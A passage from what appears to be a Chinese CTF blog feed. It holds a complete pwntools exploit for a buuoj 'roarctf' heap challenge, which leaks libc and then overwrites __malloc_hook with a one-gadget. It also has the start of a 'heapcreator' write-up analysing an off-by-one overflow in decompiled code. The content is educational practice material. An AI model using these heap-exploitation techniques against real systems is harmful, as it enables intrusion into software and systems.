class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#r=remote(&#x27;node4.buuoj.cn&#x27;,29287)</span></span><br><span class=\"line\">r=process(<span class=\"string\">&quot;./roarctf&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./roarctf&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;choice: &quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;content: &quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):\t</span><br><span class=\"line\">\tch(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b calloc&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">b&#x27;\\xb0&#x27;</span>)</span><br><span class=\"line\">write(<span class=\"number\">2</span>,<span class=\"number\">0x18</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0xb0</span>)+<span class=\"string\">b&#x27;\\x91&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x88</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">addr = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">offset = <span class=\"number\">0x7f99de237b88</span>-<span class=\"number\">0x7f99dde73000</span></span><br><span class=\"line\">libc_base = addr -(<span class=\"number\">0x7f99de237b88</span>-<span class=\"number\">0x7f99dde73000</span>)+<span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = libc_base+<span class=\"number\">0x3c4b10</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"><span class=\"comment\">#onegadget = 0xcafebabedeadbeef</span></span><br><span class=\"line\">onegadget = <span class=\"number\">0x4527a</span>+libc_base</span><br><span class=\"line\">realloc = libc_base+ libc.symbols[<span class=\"string\">&#x27;realloc&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;main_arena : &quot;</span>,<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">1</span>,<span class=\"number\">0x88</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">17</span>+<span class=\"string\">b&#x27;\\x71&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">3</span>,<span class=\"number\">0x10</span>,p64(malloc_hook-<span class=\"number\">0x23</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x00&#x27;</span>*(<span class=\"number\">0x13</span>-<span class=\"number\">8</span>)+p64(onegadget)</span><br><span class=\"line\">payload +=p64(realloc)</span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;\\x00&#x27;</span> * (<span class=\"number\">0x60</span>-<span class=\"built_in\">len</span>(payload)) </span><br><span class=\"line\">add(<span class=\"number\">0x60</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">6</span>,<span class=\"number\">0x60</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/03/20/buuoj-heapcreator/",
            "url": "http://example.com/2022/03/20/buuoj-heapcreator/",
            "title": "buuoj_heapcreator",
            "date_published": "2022-03-20T15:59:28.000Z",
            "content_html": "<h2 id=\"这次刷题记录开始着重整理下在glibc-223下的一些利用姿势\"><a class=\"markdownIt-Anchor\" href=\"#这次刷题记录开始着重整理下在glibc-223下的一些利用姿势\">#</a> 这次刷题记录开始着重整理下在 Glibc-2.23 下的一些利用姿势</h2>\n<p>说明下 buuoj 的一些不好的地方，buuoj 基本不会给 libc, 而有些没有后门的程序，往往需要去泄露 libc 的基地址，但是最近的一些题目很孬去匹配到正确的版本，我也就不清楚是什么问题了。这里就不过多赘述了，而匹配 libc 就不作为本文的一个要点。我们只要在本地同通过测试就好了</p>\n<h2 id=\"浅析\"><a class=\"markdownIt-Anchor\" href=\"#浅析\">#</a> 浅析</h2>\n<p>题目环境以及保护<br>\n ubuntu16</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ checksec --file=heapcreator</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/buuoj/heapcreater/heapcreator&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x400000</span>)</span><br><span class=\"line\">$ file heapcreator </span><br><span class=\"line\">heapcreator: ELF <span class=\"number\">64</span>-bit LSB executable, x86<span class=\"number\">-64</span>, version <span class=\"number\">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class=\"number\">-64.</span>so<span class=\"number\">.2</span>, <span class=\"keyword\">for</span> GNU/Linux <span class=\"number\">2.6</span><span class=\"number\">.32</span>, BuildID[sha1]=<span class=\"number\">5e69111</span>eca74cba2fb372dfcd3a59f93ca58f858, not stripped</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>程序呢并没有开启 full relro, 这里就首先反映到是不是可以修改函数的 got 表呢？根据题目描述，其实就已经断定了这是一个堆题。</p>\n<p>接下来我们就主要看看其逻辑思路了</p>\n<h3 id=\"main\"><a class=\"markdownIt-Anchor\" href=\"#main\">#</a> main</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    menu();</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, buf, <span class=\"number\">4uLL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( atoi(buf) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        create_heap();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">        edit_heap();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">        show_heap();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">        delete_heap();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid Choice&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>经典的分支结构</p>\n<h3 id=\"menu\"><a class=\"markdownIt-Anchor\" href=\"#menu\">#</a> MENU</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------------------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;          Heap Creator          &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------------------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 5. Exit                        &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;--------------------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your choice :&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"creat\"><a class=\"markdownIt-Anchor\" href=\"#creat\">#</a> Creat</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">create_heap</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  trr *v0; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+4h] [rbp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+8h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">9</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !*(&amp;heaparray + i) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(&amp;heaparray + i) = (trr *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !*(&amp;heaparray + i) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Allocate Error&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of Heap : &quot;</span>);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, buf, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\">      size = atoi(buf);</span><br><span class=\"line\">      v0 = *(&amp;heaparray + i);</span><br><span class=\"line\">      v0-&gt;ptr = (__int64)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !(*(&amp;heaparray + i))-&gt;ptr )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Allocate Error&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      (*(&amp;heaparray + i))-&gt;size = size;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content of heap:&quot;</span>);</span><br><span class=\"line\">      read_input((*(&amp;heaparray + i))-&gt;ptr, size);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;SuccessFul&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">read_input</span><span class=\"params\">(<span class=\"type\">void</span> *a1, <span class=\"type\">size_t</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = read(<span class=\"number\">0</span>, a1, a2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)result &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Error&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看 creat 的时候，首先可以看看是否存在溢出的可能。但是这道题这里没有什么溢出的可能。但是可以修改堆块的 prev_size</p>\n<h3 id=\"edit\"><a class=\"markdownIt-Anchor\" href=\"#edit\">#</a> Edit</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">edit_heap</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">4uLL</span>);</span><br><span class=\"line\">  v1 = atoi(buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;heaparray + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content of heap : &quot;</span>);</span><br><span class=\"line\">    read_input((<span class=\"type\">void</span> *)(*(&amp;heaparray + v1))-&gt;ptr, (*(&amp;heaparray + v1))-&gt;size + <span class=\"string\">&#x27;\\x01&#x27;</span>);<span class=\"comment\">// 1字节溢出</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No such heap !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是当我们看到 edit 函数的时候，但到了这里有一个非常显眼的 1 字节溢出，所以后续考虑 OFF_BY_ONE 攻击手法与其他手法配合使用</p>\n<h3 id=\"show\"><a class=\"markdownIt-Anchor\" href=\"#show\">#</a> Show</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">show_heap</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">4uLL</span>);</span><br><span class=\"line\">  v1 = atoi(buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;heaparray + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size : %ld\\nContent : %s\\n&quot;</span>, (*(&amp;heaparray + v1))-&gt;size, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)(*(&amp;heaparray + v1))-&gt;ptr);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span 